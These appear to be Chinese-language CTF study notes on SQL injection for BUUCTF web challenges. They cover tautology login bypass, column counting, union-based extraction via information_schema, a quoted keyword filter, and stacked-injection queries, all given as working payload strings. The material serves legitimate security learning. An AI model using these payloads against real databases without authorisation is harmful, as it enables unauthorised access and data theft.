# SQL 注入

  • 参考的入门题目：BUUCTF-Web EasySQL，LoveSQL，随便注，三道题目的难度递增。
  • 【引入点】判断是否有 SQL 注入：测试 admin' or '1'='1 # 语句是否会对网页产生反应，如果有，则存在注入。（原理：从前端传参的 sql 查询语句一般都采用字符串拼接，belike:
    select * from tab1 where username = 'XXX'
    如果用 admin' or '1'='1 代替 XXX，则语句变为
    select * from tab1 where username = 'admin' or '1'='1'
    or 的后半部分永真，所以可以顺利导出 tab1 的所有信息。）
    如果 admin' or '1'='1 # 报错，那么说明不存在单引号闭合，尝试
    1 or 1=1 # 如果没有报错，那么说明是整数类型的闭合（不知道这样讲算不算确切）。

# 较简单的通用部分（LoveSQL）

  1. 判断当前查询的表有几列：从 1' order by 1 # 开始查，递增 order by n，如果出现结果报错，那么就可以确定当前查询的表为 n-1 列。
    比如：LoveSQL 查询到 1' order by 4 # 的时候就报错了，说明该表没有第 4 列，故当前表有 3 列，再从这三列里找可以有注入回显的列。
  2. 查找可以回显的列：使用 1' union select 1,2,3 # ，查看会返回哪几列，则可以判断是否有回显点。
  3. 发现回显点，则使用回显点回填想要的结果。
    1. 如查询当前的数据库名： union select 1,2,databases()
    2. 查找所有数据库名： union select 1,2,group_concat(schema_name) from information_schema
    3. 查找数据库里的所有表名： union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='XXX'
    4. 查找表内的所有字段名： union select 1,2,group_concat(column_name) from information_schema.columns where table_name='YYY'
    5. 查找某字段内的所有数据： union select 1,2,group_concat(ZZZ) from XXX.YYY

# 随便注

发现不了回显点，全部被正则过滤了。
1' union select 1,2 返回
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
说明常见的 select，update，delete，drop，insert，where 等指令都不能直接运用于探测回显点，查询数据库名，表名，列名，数据内容，全部被 ban 死了，就得考虑一下别的方法。

# 堆叠注入

  • 查询数据库名： 1';show databases;#
  • 查询数据表名： 1';show tables;#
  • 查询一张表里的列名： 1';show columns from XXX;# (表名最好加反引号，避免数字直接混入)
